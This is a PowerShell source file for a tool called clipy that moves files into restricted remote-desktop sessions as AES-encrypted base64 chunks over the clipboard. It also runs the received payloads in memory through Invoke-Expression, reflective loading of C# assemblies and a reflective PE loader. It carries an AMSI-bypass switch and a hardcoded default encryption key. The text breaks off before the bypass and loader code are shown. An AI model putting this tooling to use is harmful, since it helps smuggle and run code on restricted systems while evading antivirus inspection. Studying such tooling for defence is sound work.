function Invoke-Clipy {
    <#
    .SYNOPSIS
    clipy is a Powershell tool to help you copy/paste files via RDP/ICA.
    
    .DESCRIPTION
    clipy can help you copy/paste files into restricted remote desktop environments, e.g. via RDP/ICA, where it is not possible to copy files directly to it and copy/paste of ASCII via the clipboard is the only way.
    
    .PARAMETER Action
    Select if clipy is in _Sender_ or _Receiver_ mode or use _CryptFileWrite_ and _CryptFileRead_ to build an AES encrypted output file or read it back in again.

    .PARAMETER InputFile
    Filepath of the input file you want to read.

    .PARAMETER OutputFile
    Filepath of the output file you want to write to.

    .PARAMETER Force
    Force overwriting an existing file.
    
    .PARAMETER AESKey
    Use your own AES key for encryption and decryption instead of the pre-defined own of clipy.
    
    .PARAMETER maxSize
    Fine tune the base64 chunk size to your needs, 2MB are default. Possible values are "0.1MB", "0.25MB", "0.5MB", "1MB", "1.4MB", "1.6MB", "1.8MB", "2MB", "2.5MB", "4MB", "6MB", "8MB", "10MB", "20MB", "50MB".
    
    .PARAMETER InlineExec
    Use 'PSHImport' if you want to import the Powershell fuctions of the provided Powershell file,
    or 'SharpExecute' if you want ot execute the provided C# assembly file.

    .PARAMETER InlineExecArgument
    If you have used '-InlineExec SharpExecute' you most likely have to provide the arguments you want to use with your executed C# assembly.
    If you have more than 1 argument you have to pass it like -InlineExecArgument "argument1","argument2","argument3".

    .PARAMETER AMSI
    "Executes an pre-build AMSI bypass of clipy on receiver side.
    If you have the need to execute an AMSI bypass only, you can use "Invoke-AMSI".

    .EXAMPLE
    Invoke-Clipy -Action Send -InputFile "source-file.exe"
    
    Description
    -----------
    clipy reads the source file "source-file.exe" and splits it in 2MB chunks.
    
    .EXAMPLE
    Invoke-Clipy -Action Send -InputFile "source-file.exe" -maxSize 1.4MB
    
    Description
    -----------
    clipy reads the source file "source-file.exe" and splits it in 1.4MB chunks.
    
    .EXAMPLE
    Invoke-Clipy -Action Send -InputFile "source-file.exe" -AESKey "Secr3tP8ssw0rd!" -maxSize 4MB
    
    Description
    -----------
    clipy reads the source file "source-file.exe", use a specific AES encryption key instead of the default one and splits it in 4MB chunks.
    
    .EXAMPLE
    Invoke-Clipy -Action CryptFileWrite -InputFile "source-file.ps1" -OutputFile "crypted-ps1.txt"
    
    Description
    -----------
    clipy reads the source file "source-file.ps1" and stores it as AES encrypted output file.

    .EXAMPLE
    Invoke-Clipy -Action Receive -OutputFile "target-file.exe"
    
    Description
    -----------
    clipy writes the received file as "target-file.exe".

    .EXAMPLE
    Invoke-Clipy -Action Receive -OutputFile "target-file.exe" -AESKey "Secr3tP8ssw0rd!" -Force
    
    Description
    -----------
    clipy writes the received file as "target-file.exe", use a specific AES decryption key instead of the default one and force overwriting the target file if it is existing already.

     .EXAMPLE
    Invoke-Clipy -Action Receive -InlineExec PSHImport -AMSI -AESKey "Secr3tP8ssw0rd!"
    
    Description
    -----------
    Clipy executes an AMSI bypass before it imports the modules of the received Powershell file and uses a specific AES decryption key instead of the default one.

    .EXAMPLE
    Invoke-Clipy -Action CryptFileRead -InputFile "crypted-ps1.txt" -InlineExec PSHImport -AMSI
    
    Description
    -----------
    Clipy executes an AMSI bypass before it imports the modules of the AES encrypted Powershell input file.
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, HelpMessage="Use 'Send' or 'Receive' to either send or receive a file")]
        [ValidateSet("Send", "Receive", "CryptFileWrite", "CryptFileRead")]
        [String] $Action,

        [Parameter(Mandatory = $false, HelpMessage="Use your own AES key for encryption")]
        [ValidateNotNullOrEmpty()]
        [string] $AESKey,

        [Parameter(Mandatory = $false, HelpMessage="Use 'InputFile' to point to the file you want to read")]
        [ValidateNotNullOrEmpty()]
        [string] $InputFile,

        [Parameter(Mandatory = $false, HelpMessage="Use 'OutputFile' to point to the file you want towrite")]
        [ValidateNotNullOrEmpty()]
        [string] $OutputFile,

        [Parameter(Mandatory = $false, HelpMessage="Force overwriting an existing file")]
        [switch] $Force,

        [Parameter(Mandatory = $false, HelpMessage="Fine tune the base64 chunk size to your needs, 2MB are default")]
        [ValidateSet("0.1MB", "0.25MB", "0.5MB", "1MB", "1.4MB", "1.6MB", "1.8MB", "2MB", "2.5MB", "4MB", "6MB", "8MB", "10MB", "20MB", "50MB")]
        $maxSize,

        [Parameter(Mandatory = $false, HelpMessage="Use 'PSHImport' if you want to import Powershell fuctions, 'PSHExecute' if you want to execute the Powershell code directly or use SharpExecute for to execute a .Net/C# Assembly")]
        [ValidateSet("PSHImport", "SharpExecute", "PEExecute")]
        [String] $InlineExec,

        [Parameter(Mandatory = $false, HelpMessage="The arguments you want to pass to your executed C# assembly input file")]
        [ValidateNotNullOrEmpty()]
        [string[]] $InlineExecArgument = @(),

        [Parameter(Mandatory = $false, HelpMessage="Executes an AMSI bypass on receiver side")]
        [switch] $AMSI
    )

    # show clipy logo
    $clipyVersion = '0.2.0'
    Get-ANSI -Color Blue -Value $clipyVersion -Logo

    # build the arguments
    $CopyToClipArguments = @{}
    $CopyFromClipArguments = @{}
    if ($PSBoundParameters['InputFile']) { $CopyToClipArguments['FilePath'] = $InputFile }
    if ($PSBoundParameters['OutputFile']) { $CopyFromClipArguments['FilePath'] = $OutputFile }
    if (-not $PSBoundParameters['AESKey']) { $AESKey = "YC/gwssk57j:QFNvFH,Tq52a" } ; $CopyToClipArguments['AESKey'] = $AESKey ; $CopyFromClipArguments['AESKey'] = $AESKey
    if ($PSBoundParameters['maxSize']) { $CopyToClipArguments['maxSize'] = $maxSize }
    if ($PSBoundParameters['InlineExec']) { $CopyFromClipArguments['InlineExec'] = $InlineExec }
    if ($PSBoundParameters['InlineExecArgument']) { $CopyFromClipArguments['InlineExecArgument'] = $InlineExecArgument }
    if ($PSBoundParameters['Force']) { $CopyToClipArguments['Force'] = $true ; $CopyFromClipArguments['Force'] = $true }
    if ($PSBoundParameters['AMSI']) { $CopyFromClipArguments['AMSI'] = $true }

    if ($Action -eq "Send") {
        if (-not $InputFile) {
            Write-Host -ForegroundColor Red "No parameter -InputFile provided"
        } else {
            Send-ClipValue @CopyToClipArguments
        }
        
    } elseif ($Action -eq "Receive") {
        if ($(-not $OutputFile) -and $(-not $InlineExec)) {
            Write-Host -ForegroundColor Red "Neither parameter -OutputFile nor -InlineExec provided"
        } else {
            Get-ClipValue @CopyFromClipArguments
        }
        
    } elseif ($Action -eq "CryptFileWrite") {
        if (-not $OutputFile) {
            Write-Host -ForegroundColor Red "No parameter -OutputFile provided"
        } elseif (-not $InputFile) {
            Write-Host -ForegroundColor Red "No parameter -InputFile provided"
        } else {
            Send-ClipValue @CopyToClipArguments -CryptFileOut $OutputFile -maxSize 100MB
        }

    } elseif ($Action -eq "CryptFileRead") {
        if (-not $InputFile) {
            Write-Host -ForegroundColor Red "No parameter -InputFile provided"
        } elseif (-not $InlineExec) {
            Write-Host -ForegroundColor Red "No parameter -InlineExec provided"
        } else {
            Get-ClipValue @CopyFromClipArguments -CryptFileIn $InputFile
        }
    }
}

function Send-ClipValue {
    <#
    .DESCRIPTION
    Helper function. Takes an input file, do compression, base64 encoding and AES encrypting. The result is either be splitted in chunks and provided to the clipboard or directly stored in an output file for further usage.
    
    .PARAMETER FilePath
    Filepath of the input file you want to read.

    .PARAMETER CryptFileOut
    Filepath of the crypted output file you want to write to. If this parameter is set, no splitted chunks will created to be used via clipboard but directly stored in a single file.

    .PARAMETER Force
    Force overwriting an existing file.
    
    .PARAMETER AESKey
    Use your own AES key for encryption and decryption instead of the pre-defined own of clipy.
    
    .PARAMETER maxSize
    Fine tune the base64 chunk size to your needs, 2MB are default. Possible values are "0.1MB", "0.25MB", "0.5MB", "1MB", "1.4MB", "1.6MB", "1.8MB", "2MB", "2.5MB", "4MB", "6MB", "8MB", "10MB", "20MB", "50MB".
    #>
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string] $FilePath,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $CryptFileOut,

        [Parameter(Mandatory = $false)]
        [switch] $Force,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $AESKey,

        [Parameter(Mandatory=$false)]
        [int] $maxSize = 2MB
    )

    $WriteClipyFileArguments = @{}
    if ($PSBoundParameters['CryptFileOut']) { $WriteClipyFileArguments['FilePath'] = $CryptFileOut }
    if ($PSBoundParameters['Force']) { $WriteClipyFileArguments['Force'] = $true }

    if (Test-Path -Path $FilePath) {
        # get file
        $inputFileHash = Read-ClipyFile -FilePath $FilePath -GetHash
        $contentRaw = Read-ClipyFile -FilePath $FilePath -Format Binary

        # compress and base64 encode input
        Write-Host "Doing some compressing and encrypting tasks. This can take some time..."
        $contentBlob = Get-CompressedByteArray -byteArray $contentRaw

        Write-Verbose "[Send-ClipValue] Do Base64 encoding of data..."
        $contentBlobB64 = [System.Convert]::ToBase64String($contentBlob)

        Write-Verbose "[Send-ClipValue] Do AES encrypting of data..."
        $contentBase64 = Invoke-AESEncryption -Mode Encrypt -Key $AESKey -Text $contentBlobB64

        # create some variables
        $chunksCompleteLength = $([Math]::Round($($contentBase64.Length / 1KB), 2))
        $chunkNumbers = $([Math]::Ceiling($contentBase64.Length / $maxSize))
        if ($chunkNumbers -eq 1) {$chunkName = "chunk"} else {$chunkName = "chunks"}
        $chunkNumber = 1
        $chunkHeader = "##"
        $chunkSplit = "."

        if ($CryptFileOut) {
            try {
                Write-Host "Trying to write encrypted payload with $chunksCompleteLength KByte to '$CryptFileOut' in $(Get-ANSI -Color Blue -Value $chunkNumbers) $chunkName ($($maxSize / 1MB) MByte chunk size)"
                # build hash of input
                $contentHashBlob = [System.Security.Cryptography.HashAlgorithm]::Create("sha1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($AESKey+$chunkNumbers+$chunkNumber+$contentBase64))
                $contentHash = [System.BitConverter]::ToString($contentHashBlob).Replace("-","").ToLower()

                # put header to payload and write the file
                $contentPayload = $chunkHeader + $chunkSplit + $chunkNumbers + $chunkSplit + $chunkNumber + $chunkSplit + $contentHash + $chunkSplit + $contentBase64
                Write-ClipyFile @WriteClipyFileArguments -asString  $contentPayload
            } catch {
                Write-Error "[Send-ClipValue] Error writing encrypted content: $_"
            }

        } else {
            # split the input
            Write-Host "Splitting payload with $chunksCompleteLength KByte to Clipboard in $(Get-ANSI -Color Blue -Value $chunkNumbers) $chunkName ($($maxSize / 1MB) MByte chunk size)"
            Write-Verbose "[Send-ClipValue] Start splitting the data..."
            for($i = 0; $i -lt $contentBase64.Length) {
                # calculate chunk length and hash of it
                $subString = $contentBase64.Substring($i, ([Math]::Min($maxSize,$contentBase64.Length - $i)))
                $subStringHashBlob = [System.Security.Cryptography.HashAlgorithm]::Create("sha1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($AESKey+$chunkNumbers+$chunkNumber+$subString))
                $subStringHash = [System.BitConverter]::ToString($subStringHashBlob).Replace("-","").ToLower()

                # put chunk header to payload
                $chunkPayload = $chunkHeader + $chunkSplit + $chunkNumbers + $chunkSplit + $chunkNumber + $chunkSplit + $subStringHash + $chunkSplit + $subString
                $chunkPayload | Set-Clipboard

                if ($i + $maxSize -lt $contentBase64.Length) {
                    $text = "Press any key for next chunk. [R] to repeat"
                } else {
                    $text = "Press any key to finish. [R] to repeat"
                }

                $chunkSize = $([Math]::Round($($subString.Length / 1KB), 2))
                $key = Read-Host -Prompt "Chunk $(Get-ANSI -Color Blue -Value $chunkNumber) ($chunkSize KBytes) of $(Get-ANSI -Color Blue -Value $chunkNumbers) with hash $(Get-ANSI -Color Blue -Value $subStringHash). $text"
                if ($key -ne 'R') {
                    $i += $maxSize
                    $chunkNumber +=1
                }
            }
            Write-Host "$(Get-ANSI -Color Green -Value "Finished") all chunks of the file with SHA256 hash $(Get-ANSI -Color Green -Value $inputFileHash.Hash)"
        }
    } else {
        Write-Host "File '$FilePath' does not exist" -ForegroundColor Red
    }
}

function Get-ClipValue {
    <#
    .DESCRIPTION
    Helper function. Reads AES encrypted clipy content either via clipboard or encrpyted input file. After successful reading data via clipboard it stores the decrypted content to an output file.
    If the input was either Powershell code via clipboard or an encrpyted input file, it can import the included Powershell modules or execute the code in the Powershell process directly.
    
    .PARAMETER FilePath
    Filepath of the output file you want to write to.

    .PARAMETER CryptFileIn
    Filepath of the AES encrypted clipy input file you want to read.

    .PARAMETER Force
    Force overwriting an existing file.
    
    .PARAMETER AESKey
    Use your own AES key for encryption and decryption instead of the pre-defined own of clipy.
    
    .PARAMETER InlineExec
    Use 'PSHImport' if you want to import the Powershell fuctions of the provided Powershell file,
    or 'SharpExecute' if you want ot execute the provided C# assembly file.

    .PARAMETER InlineExecArgument
    If you have used '-InlineExec SharpExecute' you most likely have to provide the arguments you want to use with your executed C# assembly.
    If you have more than 1 argument you have to pass it like -InlineExecArgument "argument1","argument2","argument3".

    .PARAMETER AMSI
    "Executes an pre-build AMSI bypass of clipy on receiver side.
    #>
    param (
        [Parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string] $FilePath,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $CryptFileIn,

        [Parameter(Mandatory = $false)]
        [switch] $Force,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $AESKey,

        [Parameter(Mandatory = $false)]
        [ValidateSet("PSHImport", "SharpExecute", "PEExecute")]
        [String] $InlineExec,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string[]] $InlineExecArgument = @(),

        [Parameter(Mandatory = $false)]
        [switch] $AMSI
    )

    # build the arguments
    $StartPSHArguments = @{}
    if ($PSBoundParameters['AMSI']) { $StartPSHArguments['AMSI'] = $true }

    $StartArguments = @{}
    if ($PSBoundParameters['AMSI']) { $StartArguments['AMSI'] = $true }
    if ($PSBoundParameters['InlineExecArgument']) { $StartArguments['Argument'] = $InlineExecArgument }

    $GetClipInputArguments = @{}
    if ($PSBoundParameters['AESKey']) { $GetClipInputArguments['AESKey'] = $AESKey }
    if ($PSBoundParameters['CryptFileIn']) { $GetClipInputArguments['CryptFileIn'] = $CryptFileIn }

    $WriteClipyFileArguments = @{}
    if ($PSBoundParameters['FilePath']) { $WriteClipyFileArguments['FilePath'] = $FilePath }
    if ($PSBoundParameters['Force']) { $WriteClipyFileArguments['Force'] = $true }

    if ($InlineExec -eq "PSHImport") {
        $pshCode = [System.Text.Encoding]::ASCII.GetString($(Get-ClipyInput @GetClipInputArguments))
        Invoke-PSHExecute -Code $pshCode -Action Import @StartPSHArguments
    }
    elseif ($InlineExec -eq "SharpExecute") {
        $SharpAssembly = Get-ClipyInput @GetClipInputArguments
        Invoke-SharpExecute -asByte $SharpAssembly @StartArguments
    }
    elseif ($InlineExec -eq "PEExecute") {
        $PEBlob = Get-ClipyInput @GetClipInputArguments
        Invoke-PEExecute -asByte $PEBlob @StartArguments
    }
    elseif ($CryptFileIn) {
        Write-Host -ForegroundColor Red "You have to use parameter -InlineExec to read and execute an encrypted clipy file!"
    }
    else {
        # get data with cmdlet Get-Input
        try {
            $output = Get-ClipyInput -AESKey $AESKey
            if ($output) { Write-ClipyFile @WriteClipyFileArguments -asByte $output }
        } catch {
            Write-Error "[Get-ClipValue] Error writing received content: $_"
        }
    }
}

function Get-ClipyInput {
    <#
    .DESCRIPTION
    Helper function. Reads AES encrypted clipy content either via clipboard or encrpyted input file.

    .PARAMETER CryptFileIn
    Filepath of the AES encrypted clipy input file you want to read.
    
    .PARAMETER AESKey
    Use your own AES key for encryption and decryption instead of the pre-defined own of clipy.
    #>
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $AESKey,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $CryptFileIn
    )

    $content = ""
    $chunkNumber = 1

    if (-not $CryptFileIn) { Write-Host "Waiting for incoming chunks..." }
    
    # change input of while loop to 'read clipboard' or 'read cryptfile'
    while(![System.String]::IsNullOrEmpty($(if ($CryptFileIn) {($ClipInputRaw = Read-ClipyFile -FilePath $CryptFileIn -Format Text)} else {($ClipInputRaw = Get-Clipboard -Raw)}))) {
        $ClipInput = $ClipInputRaw.split(".")
        <#
        $ClipInput[0] = Clipy header: ##
        $ClipInput[1] = Total number of chunks
        $ClipInput[2] = Single chunk number
        $ClipInput[3] = SHA1 hash of 'AESKey+$ClipInput[1]+$ClipInput[2]+$ClipInput[4]'
        $ClipInput[4] = Payload
        #>

        # check if the inputs fits to our clipy headers
        if ($ClipInput.Count -eq 5) {
            if ($ClipInput[0] -eq "##" -and $ClipInput[1] -match "\d+$" -and $ClipInput[2] -match "\d+$" -and $ClipInput[3].length -eq 40) {
                $subStringHashBlob = [System.Security.Cryptography.HashAlgorithm]::Create("sha1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($AESKey+$ClipInput[1]+$ClipInput[2]+$ClipInput[4]))
                $subStringHash = [System.BitConverter]::ToString($subStringHashBlob).Replace("-","").ToLower()

                # check if received hash matches our calculated one
                if ($ClipInput[3] -eq $subStringHash) {
                    $base64 = $ClipInput[4]

                    if ($chunkNumber -eq $ClipInput[2] -and $chunkNumber -le $ClipInput[1]) {
                        if (-not $CryptFileIn) { Write-Host "Successfully read chunk $(Get-ANSI -Color Blue -Value $ClipInput[2]) of $(Get-ANSI -Color Blue -Value $ClipInput[1]) with ($([Math]::Round($($base64.Length / 1KB), 2)) KBytes): hash $(Get-ANSI -Color Blue -Value $subStringHash)"}
                        $content += $base64
                        $chunkNumber += 1

                        # if everything seems ok let's finish or proceed
                        if ($chunkNumber -gt $ClipInput[1]) {
                            Write-Host "Successfully read the complete content, proceeding further..."
                            $ReadSuccess = $true
                            break
                        }
                    } else {
                        Write-Host "Received chunk $(Get-ANSI -Color Red -Value $ClipInput[2]) of $(Get-ANSI -Color Blue -Value $ClipInput[1]) but need chunk $(Get-ANSI -Color Blue -Value $chunkNumber), please try again."
                    }
                    $text = "Press any key for next chunk. [F] to finish"
                    $key = Read-Host -Prompt $text

                    if ($key -eq "F") {
                        Write-Host -ForegroundColor Red "You did not receive to complete content and the data proceed with will be damaged..."
                        break
                    }

                } else {
                    if ($CryptFileIn) {
                        write-verbose "[Get-ClipyInput] Partial content of file: $($ClipInputRaw.substring(0,40))..."
                        Throw "The content of '$CryptFileIn' could not be decrypted. Either the file is corrupted or you used the wrong AES key!"
                    } else {
                        write-verbose "[Get-ClipyInput] Partial content of clipboard: $($ClipInputRaw.substring(0,40))..."
                        $text = "Received a damaged chunk, consider to set a smaler -maxSize parameter, press any key and try again!"
                        Read-Host -Prompt $text | Out-Null
                    }
                }
            }
        }
        else {
            if ($CryptFileIn) {
                Throw "The content of '$CryptFileIn' is no valid crypted clipy file!"
            } else {
                write-verbose "[Get-ClipyInput] Content of clipboard: $($ClipInputRaw.substring(0,$ClipInputRaw.length))"
                $text = "There was something in the clipboard but that was no valid chunk, press any key and try again!"
                Read-Host -Prompt $text | Out-Null
            }
        }
    }

    if ($ReadSuccess) {
        # AES decrypt, base64 decode and decompress imported data
        try {
            Write-Verbose "[Get-ClipyInput] Do AES decrypting of data..."
            $outputBlobB64 = Invoke-AESEncryption -Mode Decrypt -Key $AESKey -Text $content

            try {
                Write-Verbose "[Get-ClipyInput] Do Base64 decoding of data..."
                $outputBlob = $([System.Convert]::FromBase64String($outputBlobB64))

                try {
                    $output = Get-DecompressedByteArray -byteArray $outputBlob
                    return $output

                } catch {
                    Write-Error "[Get-ClipyInput] Error decompressing Base64 blob: $_"
                    break
                }
            } catch {
                Write-Error "[Get-ClipyInput] Error decrypting AES stream: $_"
                break
            }
        } catch {
            Write-Error "[Get-ClipyInput] Error decrypting AES stream: $_"
            break
        }
    } else {
        Write-Error "[Get-ClipyInput] Oooops, something went terrible wrong. Likely there was binary data in the clipboard!"
    }
}

function Write-ClipyFile {
    <#
    .DESCRIPTION
    Helper function to write clipy content to a file.
    
    .PARAMETER FilePath
    Filepath of the output file you want to write.

    .PARAMETER Force
    Force overwriting an existing file.
    
    .PARAMETER asString
    Stores the output as text.
    
    .PARAMETER asByte
    Stores the output in binary format.
    #>
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $FilePath,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $asString,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [byte[]] $asByte,

        [Parameter(Mandatory = $false)]
        [switch] $Force
    )

    if ($FilePath) {

        if ($(-not $asByte) -and $(-not $asString)) {
            Throw "Unable to write to a file without any input!"
        } elseif ($asByte -and $asString) {
            Throw "You have to specify the content type!"
        }

        try {
            if (!(Test-Path -Path $FilePath) -or $Force -or ((Read-Host -Prompt "File '$FilePath' already exists. Overwrite? (Y/N)") -eq "Y")) {
                Set-Content -Path $FilePath -value "" -ErrorAction Stop
                $FilePath = Resolve-Path $FilePath
            } else {
                break
            }
        } catch {
            Write-Host "Could not write to file '$FilePath': $_"
            break
        }

        if ($asByte) {
            Write-Verbose "[Write-ClipyFile] Writing data to output file '$FilePath' as 'ByteArray'"
            [io.file]::WriteAllBytes($FilePath,$asByte)
            
        } elseif ($asString) {
            Write-Verbose "[Write-ClipyFile] Writing data to output file '$FilePath' as 'Text'"
            [io.file]::WriteAllText($FilePath,$asString)
        }

        $FileHash = Read-ClipyFile -FilePath $FilePath -GetHash
        Write-Host "$(Get-ANSI -Color Green -Value "Finished"), SHA256 hash of written file is $(Get-ANSI -Color Green -Value $FileHash.Hash)"
    }
}

function Read-ClipyFile {
    <#
    .DESCRIPTION
    Helper function to read content from a file.
    
    .PARAMETER FilePath
    Filepath of the input file you want to read.
    
    .PARAMETER GetHash
    Calculates a SHA256 hash of the input file.
    
    .PARAMETER Format
    Defines how the input is read and returned. Either read as plain text (returned as string), read binary (returned as ByteArray) or read binary (returned as Base64)
    #>
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $FilePath,

        [Parameter(Mandatory = $false)]
        [switch] $GetHash,

        [Parameter(Mandatory = $false)]
        [ValidateSet("Text", "Binary","Base64")]
        [string] $Format = "Text"
    )

    if ($FilePath) {
        if (Test-Path -Path $FilePath) {
            $FilePath = Resolve-Path $FilePath
            Write-Verbose "[Read-ClipyFile] Resolved full file path as '$FilePath'"
            
            if ($GetHash) {
                Write-Verbose "[Read-ClipyFile] Get Hash256 of file '$FilePath'"
                $FilePathHash = Get-FileHash -Algorithm SHA256 -Path $FilePath
                Return $FilePathHash

            } else {
                $FilePathLength = $([Math]::Round($((Get-Item $FilePath).length/ 1KB), 2))
                Write-Host "Reading input file $(Get-ANSI -Color Blue -Value $FilePath) with $FilePathLength KByte raw data"

                if ($Format -eq "Text") {
                    Write-Verbose "[Read-ClipyFile] Reading input file '$FilePath' as 'Text'"
                    $contentRaw = [io.file]::ReadAllText($FilePath)
                } else {
                    Write-Verbose "[Read-ClipyFile] Reading input file '$FilePath' as 'ByteArray'"
                    $contentRaw = [io.file]::ReadAllBytes($FilePath)
                    if ($Format -eq "Base64") {
                        $contentRaw = [System.Convert]::ToBase64String($contentRaw)
                    }
                }

                if ($contentRaw) {
                    Return  $contentRaw
                } else {
                    Throw "There was no data in file '$FilePath'"
                }
            }
            
        } else {
            Throw "Could not access the provided input file '$FilePath'"
        }
    }
}

function Invoke-PSHExecute {
    <#
    .DESCRIPTION
    Helper function. Execute given Powershell code either directly or import its modules.
    
    .PARAMETER Code
    Powershell code that will be executed or imported.

    .PARAMETER Action
    Use 'Import' if you want to import Powershell fuctions, or 'Execute' if you want to execute the Powershell code directly. Defaults to "Execute"

    .PARAMETER AMSI
    Executes an pre-build AMSI bypass of clipy on receiver side.
    #>
    param (
        [Parameter(Mandatory=$true)]
        [string] $Code,

        [Parameter(Mandatory=$false)]
        [ValidateSet("Execute", "Import")]
        [string] $Action = "Execute",

        [Parameter(Mandatory = $false)]
        [switch] $AMSI
    )
    PROCESS {
        if ($Code) {

            if ($AMSI) { Invoke-AMSI }

            if ($Action -eq "Import") {
                $PshModule = [ScriptBlock]::Create($Code)
                New-Module -ScriptBlock $PshModule -name Invoke-PshClipy | Import-Module
            } else {
                Write-Verbose "[Invoke-PSHExecute] Powershell code that gets executed:`n$Code"
                Invoke-Expression -Command $Code
            }
        }
    }
}

function Invoke-SharpExecute {
    <#
    .SYNOPSIS
    Executes a provided C# input and loads it via reflection into Powershell.
    
    .DESCRIPTION
    You can provid C# input either as pure ByteArray or Base64 and load its content via reflection into your Powershell instance.
    It will recognize the public namespace and public class of the C# assembly and tries to start it. Therefore, the namespace and class MUST be set public in the C# Source Code.
    
    .PARAMETER asBase64
    Reads the given input as Base64 string.
    You can build a Base64 string of an input file with the following example:
    $a = Read-ClipyFile -FilePath <yourInputFilePath> -Format Base64

    .PARAMETER asByte
    Reads the given input as ByteArray.
    You can build a ByteArray of an input file with the following example:
    $a = Read-ClipyFile -FilePath <yourInputFilePath> -Format Binary

    .PARAMETER Argument
    The arguments you want to pass to the started C# assembly. Depends obviously on our input C# assembly.
    If you have more than 1 argument you have to pass it like -Argument "argument1","argument2","argument3".

    .PARAMETER AMSI
    "Executes an pre-build AMSI bypass.
    #>
    param (
        [Parameter(Mandatory = $false, HelpMessage="Content of the C# assembly as Base64")]
        [ValidateNotNullOrEmpty()]
        [string] $asBase64,

        [Parameter(Mandatory = $false, HelpMessage="Content of the C# assembly as ByteArray")]
        [ValidateNotNullOrEmpty()]
        [byte[]] $asByte,

        [Parameter(Mandatory=$false, HelpMessage="Arguments to pass to the C# assembly")]
        [ValidateNotNullOrEmpty()]
        [string[]] $Argument = @(),

        [Parameter(Mandatory = $false, HelpMessage="Executes an AMSI bypass")]
        [switch] $AMSI
    )
    PROCESS {

        if ($AMSI) { Invoke-AMSI }

        try {
            if ($asBase64) {
                $asByte = ([Convert]::FromBase64String($asBase64))
            }
            $Assembly = [System.Reflection.Assembly]::Load($asByte)
            $AssemblyDisplayName = $Assembly.ManifestModule
            Write-Verbose "[Invoke-SharpExecute] Loading of C# assembly '$AssemblyDisplayName' successfull"

            # Setting a custom stdout to capture Console.WriteLine output
            $OldConsoleOut = [Console]::Out
            $StringWriter = New-Object IO.StringWriter
            [Console]::SetOut($StringWriter)

            Write-Verbose "[Invoke-SharpExecute] Trying to start '$AssemblyDisplayName' with arguments: '$Argument'"
            $Arguments = New-Object -TypeName System.Collections.ArrayList
            $Arguments.add($Argument) | Out-Null
            
            try {
                $Assembly.EntryPoint.Invoke($Null, $Arguments.ToArray())
            }
            catch {
                Write-Error "[Invoke-SharpExecute] The C# assembly '$AssemblyDisplayName' could not be started. $_"
            }

            # Restore the regular stdout object
            [Console]::SetOut($OldConsoleOut)
            $Results = $StringWriter.ToString()
            $Results
        }
        catch {
            Throw "[Invoke-SharpExecute] Error loading the provided C# assembly. $_"
        }
    }
}

function Invoke-PEExecute {
    <#
    .SYNOPSIS
    Executes a provided PE binary file and loads it via reflection into Powershell.
    The reflective loader is based on the reflective PE loader of PowerSploit
    
    .DESCRIPTION
    You can provid PE binary input either as pure ByteArray or Base64 and load its content via reflection into your Powershell instance.
    
    .PARAMETER asBase64
    Reads the given input as Base64 string.
    You can build a Base64 string of an input file with the following example:
    $a = Read-ClipyFile -FilePath <yourInputFilePath> -Format Base64

    .PARAMETER asByte
    Reads the given input as ByteArray.
    You can build a ByteArray of an input file with the following example:
    $a = Read-ClipyFile -FilePath <yourInputFilePath> -Format Binary

    .PARAMETER Argument
    The arguments you want to pass to the started PE binary. Depends obviously on our provided PE binary.
    If you have more than 1 argument you have to pass it like -Argument "argument1","argument2","argument3".
    !!! Unfortunately the reflective loader has trouble with passed arguemnts !!!!

    .PARAMETER AMSI
    "Executes an pre-build AMSI bypass.
    #>
    param (
        [Parameter(Mandatory = $false, HelpMessage="Content of the PE binary file as Base64")]
        [ValidateNotNullOrEmpty()]
        [string] $asBase64,

        [Parameter(Mandatory = $false, HelpMessage="Content of the PE binary file as ByteArray")]
        [ValidateNotNullOrEmpty()]
        [byte[]] $asByte,

        [Parameter(Mandatory=$false, HelpMessage="Arguments to pass to the PE binary file")]
        [ValidateNotNullOrEmpty()]
        [string[]] $Argument,

        [Parameter(Mandatory = $false, HelpMessage="Executes an AMSI bypass")]
        [switch] $AMSI
    )

    <# Reflective Loader blob :-)
    Example how to build this
        $b0 = [io.file]::ReadAllBytes((resolve-path "reflective-PELoader.ps1"))
        $b1 = Get-CompressedByteArray -byteArray $b0
        $b2 = [System.Convert]::ToBase64String($b1)
        $b3 = Invoke-AESEncryption -Mode Encrypt -Key "foobar" -Text $b2
        Now use the content of $b3 as content for the specific $payload below
    #>

